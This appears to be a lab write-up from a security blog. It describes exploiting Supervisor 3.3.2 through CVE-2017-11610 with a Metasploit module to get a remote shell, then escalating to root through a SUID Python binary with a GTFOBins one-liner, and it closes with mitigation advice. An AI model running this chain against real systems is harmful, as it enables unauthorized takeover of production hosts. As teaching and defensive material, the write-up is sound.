---
title: "Remote Code Execution – Supervisor Exploit to Root via SUID Python | Super Process"
date: 2026-03-31 12:30:00 +0530
categories: [Penetration Testing]
tags: [
  remote-code-execution,
  supervisor,
  cve-2017-11610,
  suid,
  privilege-escalation,
  gtfobins,
  linux,
  metasploit,
  hackviser
]
platform: Hackviser
author: Shivansh Sharma
image:
  path: /assets/images/posts/linux.webp
  alt: "Supervisor RCE Exploitation"
---

## Overview

This lab demonstrates a full attack chain starting from service enumeration to remote code execution and finally privilege escalation on a Linux system.

The target application runs an outdated version of Supervisor, which is vulnerable to authenticated XML-RPC remote code execution. After gaining initial access, privilege escalation is achieved through a misconfigured SUID binary.

---

## Objective

- Perform service enumeration
- Identify and exploit a vulnerable service
- Gain initial access to the system
- Escalate privileges to root

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV 172.20.8.159
```

Result:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian
9001/tcp open  http    Medusa httpd 1.12 (Supervisor)
```

The key finding here is the web service running on port 9001, identified as Supervisor.

### Directory Enumeration

```bash
gobuster dir -u http://172.20.8.159:9001 -w /usr/share/wordlists/dirb/big.txt
```

Result:

```
/images
/stylesheets
```

No useful attack surface was discovered through directory brute-forcing.

---

## Vulnerability Identification

Accessing the web interface revealed:

```
Supervisor 3.3.2
```

This version is vulnerable to:

- **CVE-2017-11610** — XML-RPC Remote Code Execution

---

## Exploitation

### Search for Exploit

```bash
searchsploit supervisor
```

Metasploit module identified:

```
exploit/linux/http/supervisor_xmlrpc_exec
```

### Metasploit Exploitation

```bash
msfconsole
search supervisor
use exploit/linux/http/supervisor_xmlrpc_exec
```

Set required parameters:

```bash
set RHOSTS 172.20.8.159
set LHOST <your_ip>
```

Check vulnerability:

```bash
check
```

Result:

```
[+] Vulnerable version found: 3.3.2
```

Run exploit:

```bash
exploit
```

---

## Initial Access

```bash
meterpreter > shell
whoami
```

```
nobody
```

We now have a low-privileged shell.

---

## Privilege Escalation

### Check for SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

Interesting finding:

```
/usr/bin/python2.7
```

### Exploiting SUID Python

Using GTFOBins technique:

```bash
python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Root Access

```bash
whoami
```

```
root
```

Privilege escalation successful.

---

## Proof of Exploitation

- ✅ Initial access obtained via Supervisor RCE
- ✅ Shell as `nobody`
- ✅ Escalation via SUID Python binary
- ✅ Full root access achieved

---

## Impact

- Remote attacker can execute arbitrary commands
- Full system compromise possible
- Misconfigured SUID binaries allow privilege escalation

---

## Mitigation

- Upgrade Supervisor to a secure version
- Restrict access to XML-RPC interface
- Remove unnecessary SUID permissions
- Apply principle of least privilege
- Monitor exposed management interfaces

---

## Real-World Insight

Supervisor is commonly used in production environments to manage processes. Exposing its interface without proper authentication or running outdated versions can lead to complete system compromise.

Misconfigured SUID binaries remain one of the most common and overlooked privilege escalation vectors in Linux environments.
